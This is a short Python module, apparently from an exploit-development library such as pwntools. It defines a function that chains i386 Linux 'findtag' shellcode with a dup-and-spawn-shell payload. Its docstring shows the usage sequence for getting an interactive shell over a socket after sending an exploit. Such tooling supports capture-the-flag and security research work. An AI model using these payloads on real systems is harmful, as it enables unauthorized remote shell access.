from pwn.shellcode_helper import *
from findtag import findtag
from .. import dupsh

@shellcode_reqs(arch='i386', os='linux', network=['ipv4', 'ipv6'])
def findtagsh(tag):
    """Args: Tag to look for

    Finds the current file descriptor using the findtag
    shellcode, and then runs a dupsh.
    
    Common use case:

    sock.send_exploit()
    sock.send(findtagsh(TAG))
    time.sleep(0.1)
    sock.send(TAG.ljust(127))
    sock.interactive()"""
    return findtag(tag) + dupsh("ebp")
